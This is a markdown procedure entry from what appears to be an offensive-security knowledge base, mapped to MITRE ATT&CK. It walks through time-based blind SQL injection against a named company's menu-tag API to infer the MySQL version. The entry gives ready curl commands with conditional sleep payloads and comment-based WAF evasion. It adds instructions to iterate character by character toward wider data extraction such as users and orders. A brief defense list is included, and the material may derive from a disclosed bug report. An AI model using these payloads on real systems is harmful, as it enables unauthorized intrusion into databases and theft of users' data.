---
tags:
  - sqli
  - blind-sqli
  - data-exfiltration
  - mysql
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
commands:
  - '[[commands/zomato-sqli-version-check-5]]'
  - '[[commands/zomato-sqli-version-check-4]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2024-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:15:10.227Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 7f4b745d-3132-4f34-924a-754810613ea1
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Extract-Database-Version-Using-Conditional-Sleep-Payload

## Summary

This procedure extracts the MySQL database version from Zomato's vulnerable API by using conditional IF statements with sleep functions in the item_id parameter, inferring character values through differential response times in a blind SQL injection attack.

## Description

Building on confirmed SQLi, this uses time-based blind techniques to query system functions like version(). The payload checks if the first character of version() equals a guessed value (e.g., '5'), sleeping 5 seconds if true. Response times reveal the truth value. Caching bypass via prefix variation and WAF evasion with /*f*/ comments apply. This demonstrates scalable enumeration for sensitive data like user info.

## Requirements

1. Confirmed SQLi vulnerability from prior procedure
2. Network access to the endpoint
3. Ability to measure precise response times (e.g., curl with timing flags)
4. Knowledge of MySQL functions (version(), mid(), if())

## Defense

Defensive measures and detection strategies:

- Use input validation to reject non-numeric item_id or SQL keywords
- Implement database query logging and anomaly detection for conditional/sleep usage
- Rate limiting on API to hinder time-based attacks
- Upgrade to secure coding practices like PDO with bind parameters

## Objectives

1. Infer specific database details without direct output
2. Validate conditional logic in SQLi payloads
3. Pave way for broader data collection (e.g., users, orders)

## Instructions

### Step 1: Test Condition for Version Starting with '5'

**Context**: Inject a payload that sleeps if the first character of version() is '5', using URL-encoded parameters for tags.

**Command** ([[commands/zomato-sqli-version-check-5]]):
```bash
curl -X POST "https://www.zomato.com/php/██████████" \
  -d "res_id=1111&method=add_menu_item_tags&item_id=1111-if(mid(version/*f*/(),1,1)=5,sleep/*f*/(5),0)&new_tags%5B%5D=3&menu_id=1111" --write-out "%{time_total}s\n"
```

> Expect ~6s delay if true (version starts with 5); vary prefix for caching bypass.

### Step 2: Run Control Test for '4'

**Context**: Repeat with false condition to confirm differential timing.

**Command** ([[commands/zomato-sqli-version-check-4]]):
```bash
curl -X POST "https://www.zomato.com/php/██████████" \
  -d "res_id=1111&method=add_menu_item_tags&item_id=1111-if(mid(version/*f*/(),1,1)=4,sleep/*f*/(5),0)&new_tags%5B%5D=3&menu_id=1111" --write-out "%{time_total}s\n"
```

> Quick ~1s response confirms false; comparison infers version.

### Step 3: Iterate for Full Enumeration

**Context**: Extend to check subsequent characters by adjusting mid() offsets and guessed values.

> Manually craft similar payloads, binary searching characters (0-9, a-z) based on timings.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]
- [[Collection]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/zomato-sqli-version-check-5]]
- [[commands/zomato-sqli-version-check-4]]

## Tools Used


## Tags

- sqli
- blind-sqli
- data-exfiltration
- mysql
